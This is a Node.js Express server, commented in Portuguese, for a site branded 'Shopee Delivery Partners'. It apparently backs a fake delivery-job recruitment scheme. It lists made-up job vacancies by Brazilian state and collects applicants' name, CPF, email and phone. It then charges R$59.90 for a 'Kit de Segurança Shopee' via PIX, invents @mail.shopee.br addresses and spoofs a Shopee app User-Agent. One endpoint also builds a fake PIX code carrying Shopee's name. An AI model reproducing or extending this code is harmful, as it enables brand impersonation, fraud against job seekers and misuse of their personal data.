// Servidor de produção simples - build uma vez e serve estático
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const PORT = process.env.PORT || 5000;
const app = express();

// Middlewares essenciais
app.use(cors({
  origin: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));

// Estados do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 4 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

// Produção: assumir que build já foi feito durante deploy
let buildComplete = true;
let buildError = null;

// Middleware para log
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Rotas da API
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV || 'production',
    port: PORT,
    buildComplete,
    buildError
  });
});

app.get('/api/regions', (req, res) => {
  res.json(mockRegions);
});

app.get('/api/vehicle-info/:placa', (req, res) => {
  const { placa } = req.params;
  console.log(`Consultando veículo: ${placa}`);
  
  const mockVehicleData = {
    MARCA: "VOLKSWAGEN",
    MODELO: "GOL",
    SUBMODELO: "1.0 MI",
    VERSAO: "CITY",
    ano: "2020",
    anoModelo: "2020",
    chassi: "9BWZZZ377VT004251",
    codigoSituacao: "0",
    cor: "BRANCA"
  };
  
  res.json(mockVehicleData);
});

app.get('/api/check-ip-status', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  
  res.json({
    status: 'allowed',
    message: 'IP não está bloqueado',
    ip: clientIp,
    timestamp: new Date().toISOString()
  });
});

app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
  
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  const pixResponse = {
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  };
  
  console.log('Enviando resposta de pagamento:', pixResponse);
  res.json(pixResponse);
});

// Pagnet API Integration para produção
app.post('/api/proxy/for4payments/pix', async (req, res) => {
  try {
    // Verificar se as variáveis de ambiente estão configuradas
    if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
      console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas no Heroku');
      return res.status(500).json({
        error: 'Serviço de pagamento não configurado. Configure as chaves de API Pagnet no Heroku.',
      });
    }
    
    console.log('Iniciando transação Pagnet no Heroku...');
    
    // Processar os dados recebidos
    const { name, cpf, email, phone, amount = 59.90, description = "Kit de Segurança Shopee" } = req.body;
    
    if (!name || !cpf) {
      return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
    }
    
    // Gerar email se não fornecido
    const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
    
    console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
    
    // Integração direta com Pagnet API
    const baseUrl = 'https://api.pagnetbrasil.com/v1';
    const authString = `${process.env.PAGNET_PUBLIC_KEY}:${process.env.PAGNET_SECRET_KEY}`;
    const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
    
    // Preparar dados da transação
    const amountCents = Math.round(parseFloat(amount.toString()) * 100);
    const customerCpf = cpf.replace(/[^0-9]/g, '');
    const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
    
    const payload = {
      amount: amountCents,
      paymentMethod: 'pix',
      pix: { expiresInDays: 3 },
      items: [{
        title: 'Kit de Segurança Shopee',
        unitPrice: amountCents,
        quantity: 1,
        tangible: false
      }],
      customer: {
        name: name,
        email: userEmail,
        document: { type: 'cpf', number: customerCpf },
        phone: customerPhone
      },
      externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
    };
    
    console.log('Enviando payload para Pagnet API...');
    
    // Fazer requisição para Pagnet
    const fetch = (await import('node-fetch')).default;
    const response = await fetch(`${baseUrl}/transactions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': authHeader,
        'User-Agent': 'ShopeeDeliveryApp/1.0'
      },
      body: JSON.stringify(payload)
    });
    
    const responseData = await response.json();
    
    if (!response.ok) {
      console.error('Erro da Pagnet API:', response.status, responseData);
      return res.status(500).json({
        error: 'Erro ao processar pagamento. Tente novamente.',
        details: responseData.message || 'Erro desconhecido'
      });
    }
    
    // Extrair dados do PIX da resposta
    const transactionId = responseData.id;
    const pixCode = responseData.pix?.qrcode || '';
    
    if (!pixCode) {
      console.error('PIX code não encontrado na resposta da Pagnet');
      return res.status(500).json({ error: 'Erro ao gerar código PIX' });
    }
    
    // Gerar QR Code URL
    const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
    
    // Resposta compatível com o formato esperado pelo frontend
    const pixResponse = {
      id: transactionId,
      pixCode: pixCode,
      pixQrCode: pixQrCode,
      status: 'pending',
      emailSent: false
    };
    
    console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
    res.json(pixResponse);
    
  } catch (error) {
    console.error('Erro ao processar pagamento Pagnet:', error);
    res.status(500).json({
      error: 'Erro interno do servidor ao processar pagamento',
      message: error.message
    });
  }
});

// Middleware para APIs não encontradas
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// Servir arquivos estáticos buildados
app.use(express.static(path.join(__dirname, 'dist/public'), {
  maxAge: '1d', // Cache por 1 dia
  etag: true
}));

// Rota para SPA (Single Page Application)
app.get('*', (req, res) => {
  const buildPath = path.join(__dirname, 'dist/public');
  const indexPath = path.join(buildPath, 'index.html');
  
  // Verificar se o index.html existe
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    // Se não existe, mostrar página de erro simples
    res.status(503).type('html').send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners - Erro</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #E83D22 0%, #FF6B4A 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .container {
                background: white;
                padding: 3rem;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
                text-align: center;
                max-width: 500px;
                width: 90%;
            }
            h1 { color: #E83D22; }
            .error { background: #ffe6e6; padding: 1rem; border-radius: 8px; margin: 1rem 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Shopee Delivery Partners</h1>
            <p>Arquivos não encontrados</p>
            <div class="error">
                <strong>Status:</strong> Build não foi executado durante o deploy
            </div>
            <p>Entre em contato com o suporte técnico.</p>
        </div>
    </body>
    </html>
    `);
  }
});

// Inicializar servidor de produção
function initialize() {
  console.log('🚀 Iniciando servidor Shopee Delivery Partners (Produção)...');
  
  const buildPath = path.join(__dirname, 'dist/public');
  const indexPath = path.join(buildPath, 'index.html');
  
  if (fs.existsSync(indexPath)) {
    console.log('✅ Arquivos estáticos encontrados em dist/public/');
  } else {
    console.log('⚠️  Arquivos estáticos não encontrados. Execute o build primeiro.');
  }
  
  // Iniciar servidor
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor rodando na porta ${PORT}`);
    console.log(`🌐 Ambiente: ${process.env.NODE_ENV || 'production'}`);
    console.log(`📦 Servindo arquivos estáticos de: ${buildPath}`);
  });
}

// Cleanup
process.on('SIGTERM', () => {
  console.log('Recebido SIGTERM, encerrando...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('Recebido SIGINT, encerrando...');
  process.exit(0);
});

// Inicializar
initialize();